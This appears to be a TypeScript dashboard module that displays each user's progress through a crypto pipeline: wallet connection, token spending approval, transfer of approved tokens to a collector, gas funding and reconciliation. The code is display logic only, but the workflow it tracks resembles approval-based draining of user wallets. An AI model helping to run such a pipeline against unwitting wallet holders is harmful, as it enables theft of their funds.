import { formatDate } from "@/lib/format";
import type { UserDetail } from "@/types/users";

export type FunnelStageStatus =
  | "pending"
  | "active"
  | "completed"
  | "failed"
  | "skipped";

export type FunnelStageDetail = {
  label: string;
  value: string;
};

export type FunnelStage = {
  key: string;
  label: string;
  subtitle: string;
  status: FunnelStageStatus;
  widthPercent: number;
  gradient: string;
  ring: string;
  details: FunnelStageDetail[];
};

const STAGE_DEFS = [
  {
    key: "connected",
    label: "Wallet connected",
    subtitle: "User linked wallet and opened the app",
    gradient: "from-sky-500 to-cyan-500",
    ring: "ring-sky-400/40",
  },
  {
    key: "approval",
    label: "Token approval",
    subtitle: "Spending allowance granted on-chain",
    gradient: "from-violet-500 to-purple-600",
    ring: "ring-violet-400/40",
  },
  {
    key: "collection",
    label: "Collection transfer",
    subtitle: "Approved tokens moved to collector",
    gradient: "from-amber-500 to-orange-500",
    ring: "ring-amber-400/40",
  },
  {
    key: "native",
    label: "Native funding",
    subtitle: "Gas / TRX sent back to user wallet",
    gradient: "from-emerald-500 to-teal-500",
    ring: "ring-emerald-400/40",
  },
  {
    key: "reconciliation",
    label: "Reconciliation",
    subtitle: "On-chain receipt verified and settled",
    gradient: "from-blue-500 to-indigo-500",
    ring: "ring-blue-400/40",
  },
  {
    key: "complete",
    label: "Pipeline complete",
    subtitle: "Full lifecycle finished successfully",
    gradient: "from-green-500 to-lime-500",
    ring: "ring-green-400/40",
  },
] as const;

function formatCollectable(
  items: UserDetail["summary"]["collectableRemaining"]
): string {
  if (items.length === 0) return "—";
  return items
    .map((i) => `${i.remainingHuman ?? i.remainingRaw} ${i.tokenSymbol} (${i.network})`)
    .join(", ");
}

function formatCollected(
  items: UserDetail["summary"]["totalLifetimeCollected"]
): string {
  if (items.length === 0) return "—";
  return items
    .map((i) => `${i.collectedHuman ?? i.collectedRaw} ${i.tokenSymbol} (${i.network})`)
    .join(", ");
}

function activeStageIndex(workflowStage: string): number {
  switch (workflowStage) {
    case "idle":
      return 0;
    case "connected":
      return 0;
    case "approving":
      return 1;
    case "approved":
      return 1;
    case "collecting":
      return 2;
    case "native_pending":
      return 3;
    case "completed":
      return 5;
    case "failed":
      return -1;
    default:
      return 0;
  }
}

function failedStageIndex(summary: UserDetail["summary"]): number {
  if (summary.approvalStatus === "FAILED") return 1;
  if (summary.transferStatus === "failed") return 2;
  if (summary.nativeFundingStatus === "failed") return 3;
  if (summary.workflowStage === "failed") {
    if (summary.nativeFundingStatus) return 3;
    if (summary.transferStatus) return 2;
    if (summary.approvalStatus) return 1;
    return 0;
  }
  return -1;
}

function resolveStatus(
  stageIdx: number,
  activeIdx: number,
  failedIdx: number
): FunnelStageStatus {
  if (failedIdx >= 0) {
    if (stageIdx === failedIdx) return "failed";
    if (stageIdx < failedIdx) return "completed";
    return "pending";
  }
  if (stageIdx < activeIdx) return "completed";
  if (stageIdx === activeIdx) return "active";
  return "pending";
}

export function buildUserPipelineFunnel(data: UserDetail): FunnelStage[] {
  const s = data.summary;
  const a = data.analytics;
  const activeIdx = activeStageIndex(s.workflowStage);
  const failedIdx = s.workflowStage === "failed" ? failedStageIndex(s) : -1;
  const effectiveActive = failedIdx >= 0 ? failedIdx : activeIdx;

  const connectedDetails: FunnelStageDetail[] = [
    { label: "Events", value: String(a.eventCount) },
    { label: "Networks", value: s.networksUsed.join(", ") || "—" },
    { label: "First seen", value: formatDate(s.firstSeen) },
    { label: "Last activity", value: formatDate(s.lastActivity) },
  ];

  const approvalDetails: FunnelStageDetail[] = [
    { label: "Status", value: s.approvalStatus ?? "—" },
    { label: "Approvals", value: String(a.approvalCount) },
    { label: "Collection", value: s.collectionStatus ?? "—" },
    {
      label: "Collectable",
      value: formatCollectable(s.collectableRemaining),
    },
    { label: "Active chain", value: s.activeChain ?? "—" },
  ];

  const collectionDetails: FunnelStageDetail[] = [
    { label: "Status", value: s.transferStatus ?? "—" },
    { label: "Transfers", value: String(a.transferCount) },
    { label: "Confirmed", value: String(a.confirmedTransfers) },
    { label: "Failed", value: String(a.failedTransfers) },
    {
      label: "Lifetime collected",
      value: formatCollected(s.totalLifetimeCollected),
    },
  ];

  const nativeDetails: FunnelStageDetail[] = [
    { label: "Status", value: s.nativeFundingStatus ?? "—" },
    { label: "Native transfers", value: String(a.nativeTransferCount) },
    { label: "Confirmed", value: String(a.confirmedNative) },
    { label: "Failed", value: String(a.failedNative) },
  ];

  const reconciliationDetails: FunnelStageDetail[] = [
    { label: "Status", value: s.reconciliationStatus ?? "—" },
    {
      label: "Latest tx",
      value: s.latestTransaction
        ? `${s.latestTransaction.source} · ${formatDate(s.latestTransaction.at)}`
        : "—",
    },
  ];

  const completeDetails: FunnelStageDetail[] = [
    { label: "Workflow", value: s.workflowStage },
    { label: "Health", value: s.healthStatus },
    { label: "Success rate", value: `${Math.round(a.successRate)}%` },
    { label: "Latest activity", value: s.latestActivity?.label ?? "—" },
  ];

  if (s.latestError) {
    completeDetails.push({ label: "Latest error", value: s.latestError });
  }

  const detailMap: Record<string, FunnelStageDetail[]> = {
    connected: connectedDetails,
    approval: approvalDetails,
    collection: collectionDetails,
    native: nativeDetails,
    reconciliation: reconciliationDetails,
    complete: completeDetails,
  };

  const widths = [100, 88, 76, 64, 52, 40];

  return STAGE_DEFS.map((def, i) => {
    let status = resolveStatus(i, effectiveActive, failedIdx);

    if (
      def.key === "native" &&
      a.nativeTransferCount === 0 &&
      s.workflowStage !== "native_pending" &&
      s.workflowStage !== "completed" &&
      failedIdx !== 3
    ) {
      status = status === "pending" ? "skipped" : status;
    }

    if (
      def.key === "reconciliation" &&
      !s.reconciliationStatus &&
      s.workflowStage !== "completed" &&
      failedIdx < 0
    ) {
      status = status === "pending" ? "skipped" : status;
    }

    const gradient =
      status === "failed"
        ? "from-red-500 to-rose-600"
        : status === "pending" || status === "skipped"
          ? "from-muted-foreground/25 to-muted-foreground/15"
          : def.gradient;

    const ring =
      status === "failed"
        ? "ring-red-400/50"
        : status === "active"
          ? def.ring
          : "ring-transparent";

    return {
      key: def.key,
      label: def.label,
      subtitle: def.subtitle,
      status,
      widthPercent: widths[i] ?? 40,
      gradient,
      ring: status === "active" || status === "failed" ? ring : "ring-transparent",
      details: detailMap[def.key] ?? [],
    };
  });
}

export function funnelStageStatusLabel(status: FunnelStageStatus): string {
  switch (status) {
    case "pending":
      return "Waiting";
    case "active":
      return "In progress";
    case "completed":
      return "Done";
    case "failed":
      return "Failed";
    case "skipped":
      return "Not started";
  }
}
